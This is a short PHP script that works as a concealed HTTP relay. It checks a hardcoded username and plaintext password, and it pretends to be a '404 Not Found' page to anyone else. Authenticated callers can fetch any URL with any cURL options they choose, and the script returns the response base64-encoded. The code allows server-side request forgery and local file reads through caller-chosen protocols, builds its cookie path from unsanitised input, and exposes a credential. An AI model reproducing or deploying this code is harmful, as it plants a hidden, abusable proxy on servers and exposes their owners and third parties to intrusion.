<?php

if(isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW']) && $_SERVER['PHP_AUTH_USER'] === 'tango2' && $_SERVER['PHP_AUTH_PW'] === ' 7o[Q2mK8s;V('){
        
    if(empty($_POST['Url'])){ 
        $output['content'] = 'Brak adresu url';
        $output = serialize($output);
		$output = base64_encode($output);
        echo $output; die();
    }
}else die('404 Not Found');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_POST['Url']);

foreach ($_POST['Curl'] as $key => $value) {
 
    curl_setopt($ch, constant($key), $value);
}

if($_POST['Cookie']){

    $cookiePath = 'cookies/' . $_POST['Name'] . '_cookie_' . $_POST['Thread'] . '.txt';
    
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiePath);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiePath); 
}

$content = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$err = curl_error($ch);
$errno = curl_errno($ch);
$effective_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);

$output['content'] = $content;
$output['http'] = $httpcode;
$output['err'] = $err;
$output['errno'] = $errno;
$output['effective_url'] = $effective_url;

if($_POST['Cookie']){
    
    $output['cookie_content'] = file_get_contents($cookiePath);
}

$output = serialize($output);
$output = base64_encode($output);

echo $output;

curl_close($ch);
die();

?>
